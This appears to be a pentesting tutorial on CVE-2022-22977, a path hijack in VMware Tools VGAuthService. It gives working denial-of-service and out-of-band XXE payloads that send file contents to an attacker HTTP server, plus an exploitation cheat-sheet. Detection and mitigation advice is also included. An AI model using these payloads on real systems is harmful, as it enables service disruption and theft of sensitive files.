# VMware Tools VGAuthService Path Hijack & XXE File Disclosure

{{#include ../../banners/hacktricks-training.md}}

## Summary

VGAuthService.exe, the **Guest Authentication Service** shipped with VMware Tools for Windows, runs as **NT AUTHORITY\SYSTEM** inside every VMware guest.  During start-up the service tries to load several XML configuration files from the (percent-encoded) path:

```
C:\Program%20Files\VMware\VMware%20Tools\etc
```

Because Windows treats `%20` as *literal characters*, a **low-privileged local user** can create that directory tree inside `C:\` and plant attacker-controlled XML files.  Two abuse scenarios are possible:

1. **Denial-of-Service** – feed malformed XML to crash the service and break guest ↔ host features.
2. **XML External Entity (XXE) Disclosure** – craft external entities to make the service leak the contents of arbitrary files.

The issue was publicly tracked as CVE-2022-22977 and fixed in VMware Tools 12.0.5, but the technique is generally useful when *privileged services parse attacker-reachable XML from unintended locations*.

---

## 1. Creating the Hijack Directory

```
mkdir "C:\Program%20Files\VMware\VMware Tools\etc"
```

*Why does this work?*

* `CreateFileW()` is called with the string literally containing `%20` – no URL-decode takes place.
* `Program%20Files` **does not exist by default**, so the attacker wins the race by pre-creating it.

Any subsequent references to `"…Program%20Files…"` will resolve to the *attacker-controlled* folder instead of the real `C:\Program Files`.

---

## 2. DoS via Malformed `catalog` File

Place a crafted `catalog` file in the hijack directory:

```xml
<?xml version="1.0"?>
<!DOCTYPE catalog PUBLIC "-//OASIS//DTD Entity Resolution XML Catalog V1.0//EN" "http://www.oasis-open.org/committees/entity/release/1.0/catalog.dtd">
<catalog xmlns="urn:oasis:names:tc:entity:xmlns:xml:catalog">
  <uri name="../xenc-schema.xsd" uri="\\10.0.0.2\share\xenc-schema.xsd"/>
</catalog>
```

`libxml2` treats the UNC path as an **invalid URI**, logs an error and the *SYSTEM* service terminates:

```
[warning] [VGAuthService] XML Error: uri entry 'uri' broken ?: \\10.0.0.2\share\xenc-schema.xsd
```

Guest operations (clipboard sync, drag-and-drop, etc.) remain broken until someone restarts the service – a handy local DoS.

---

## 3. XXE Out-Of-Band File Exfiltration

`libxml2` in VGAuthService is compiled **with external entity support enabled**.  We can therefore leak files readable by SYSTEM.

1.  Start a simple HTTP server in the attacker VM/host:
    ```bash
    python3 -m http.server 80
    ```

2.  Write the following files:

    `C:\Program%20Files\VMware\VMware Tools\etc\catalog`
    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE r [
      <!ELEMENT r ANY>
      <!ENTITY % sp SYSTEM "http://10.0.0.2/r7.dtd"> %sp;
      %param1;
    ]>
    <r>&exfil;</r>
    ```

    `r7.dtd` served over HTTP:
    ```xml
    <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.0.0.2/xxe?%data;'>">
    ```

3.  When the service starts it will request `r7.dtd` and attempt to fetch:

    ```http
    GET /xxe?<contents-of-win.ini> HTTP/1.1
    ```

    •  If the file contains **spaces or new-lines** the URI parsing fails but the leaked data is still written to
       `C:\ProgramData\VMware\VMware VGAuth\logfile.txt.0` (readable by administrators).

    •  Supplying a file whose contents form a **valid URI-safe string** (e.g. `C:\temp\r7.txt` containing
      `helloworld`) results in a clean out-of-band exfiltration visible in the HTTP logs:

      ```
      10.0.0.88 - - [01/Feb/2022 07:25:05] "GET /xxe?helloworld HTTP/1.0" 404 -
      ```

### What can be read?

Any file the SYSTEM account can access – e.g. `c:\windows\system32\drivers\etc\hosts`, registry hives copied to a temp file, etc.  This **does not grant full SYSTEM execution**, but leaking sensitive configs, service passwords or private keys may be enough to pivot to other escalation primitives.

---

## Detection

* `C:\Program%20Files` directory tree present – should *never* exist on a standard system.
* Repeated crashes of VGAuthService and warnings about XML errors in `logfile.txt.*`.
* Unexpected outbound HTTP requests from a guest towards attacker-controlled IPs on service start-up.

---

## Mitigations

1.  Upgrade VMware Tools to **12.0.5 or later**.
2.  As a temporary workaround, manually create `C:\Program%20Files\VMware\VMware Tools\etc` **with Administrators-only ACLs** so unprivileged users cannot write inside.
3.  Monitor for unusual `%20` encoded paths during file system audits.

---

## Exploitation Cheat-Sheet

```powershell
# 1. Prepare hijack directory (run as low priv user)
mkdir "C:\Program%20Files\VMware\VMware Tools\etc"
copy catalog C:\Program%20Files\VMware\VMware Tools\etc\

# 2. Serve external DTD
python3 -m http.server 80

# 3. Restart service (needs admin) or wait for reboot
sc stop VGAuthService & sc start VGAuthService

# 4. Observe leaked file contents in HTTP logs or
#    C:\ProgramData\VMware\VMware VGAuth\logfile.txt.0
```

---

## Take-aways for Pentesters

•  Always check for *percent-encoded* variations of privileged directories (`%20`, `%25`, etc.).  Many Windows APIs will treat them literally.

•  XML parsers linked into SYSTEM services frequently ship with **external entity support**; if you can influence *where* they load XML from you may gain powerful primitives (DoS, arbitrary file read, SSRF).

•  The lack of full RCE/LPE does not mean a bug is useless – leaking service credentials or authentication tokens often leads to further compromise.

---

## References

- [The Guest Who Could? Exploiting LPE in VMware Tools](https://swarm.ptsecurity.com/the-guest-who-could-exploiting-lpe-in-vmware-tools/)
- [Rapid7 – CVE-2022-22977: VMware Guest Authentication Service LPE fixed](https://www.rapid7.com/blog/post/2022/05/24/cve-2022-22977-vmware-guest-authentication-service-lpe-fixed/)
- [Broadcom / VMware Security Advisory VMSA-2022-0011](https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23631)

{{#include ../../banners/hacktricks-training.md}}
